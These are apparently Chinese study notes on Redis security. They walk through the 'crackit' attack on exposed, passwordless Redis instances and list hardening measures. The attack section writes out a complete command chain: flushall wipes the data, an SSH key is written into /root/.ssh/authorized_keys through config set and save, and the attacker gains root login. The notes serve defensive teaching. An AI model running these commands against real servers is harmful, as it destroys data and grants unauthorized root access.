### 安全问题

#### 案例 - 全球crackit攻击

* 过程示意图

  ![](C:\Users\narli\Desktop\learning\Redis\12.Redis开发规范与安全\images\crackit示意图.PNG)

* 被攻击者存在问题

  * redis没有设置密码
  * redis可以通过公网ip访问
  * redis使用默认端口启动
  * redis没有绑定特定网卡
  * redis以root启动

* 攻击流程

  * 攻击前尝试连接到被攻击者服务器

    ```bash
    >> ssh root@123.45.67.89 # 失败，因为你没有密钥，也没有ssh-keygen
    ```

  * 由于被攻击者外网开放，且使用默认端口，且没有限制网卡流量

    ```bash
    >> redis-cli -h 123.45.67.89 -p 6379 ping
    >> PONG
    >> redis-cli -h 123.16.14.182 -p 6379 flushall
    >> OK
    ```

  * 在攻击者服务器生成一个公钥，并将公钥保存到一个id_rsa.pub中

    ```bash
    >> ssh-keygen -C rsa -t "email@gmail"
    >> cat id_rsa.pub
    ```

  * 将公钥内容作为value添加到redis中

    ```bash
    >> redis-cli -h 123.45.67.89 -p 6379 -x set crackit
    >> redis-cli -h 123.45.67.89 -p 6379 get crackit
    ```

  * 将redis的dir设置为/root/.ssh目录，dbfilename设置为authorized_keys

    ```bash
    123.45.67.89:6379> config set dir /root/.ssh
    OK
    123.45.67.89:6379> config set dbfilename authorized_keys
    OK
    123.45.67.89:6379> save
    OK
    ```

  * 此时，因为被攻击者服务器上已经有了攻击者的公钥，即攻击者可以用ssh进行登录



#### 安全七法则

* 设置密码

  * 服务端配置：requirepass和masterauth
  * 客户端连接：auth命令和-a参数
  * 注意事项
    * 密码要足够复杂，因为redis性能太强，暴力破解比较简单
    * 不要忘记masterauth
    * auth是通过明文传输的，所以是有被盗窃的风险

* 伪装危险命令

  * 原理：类似linux的alias，将一些命令重新起个名字

  * 实现：在配置文件中

    ```bash
    rename-command flushall abc
    ```

  * 注意事项

    * 不支持动态 config set
    * RDB或AOF如果包含有rename-command之前的命令，将无法使用
    * config命令本身在redis内核中会使用到，不建议重命名

* 绑定网卡

  * 通过bind命令来限制redis可以接收的流量的网卡

  * 实现：在配置文件中

    ```bash
    bind 127.0.0.1
    ```

  * 注意事项：

    * bind不支持config set
    * bind 127.0.0.1要谨慎，因为这样做就只能接收到本机流量
    * 如果存在外网网卡就尽量屏蔽掉

* 防火墙

  * 最强的，最安全的技术

* 定期备份

  * 避免数据丢失，非常重要的措施

* 不使用默认端口

  * 参考全球crackit攻击中使用默认端口6379启动redis而带来的危害

* 使用非root用户启动

  * 参考全球crackit攻击中使用root启动redis而带来的危害

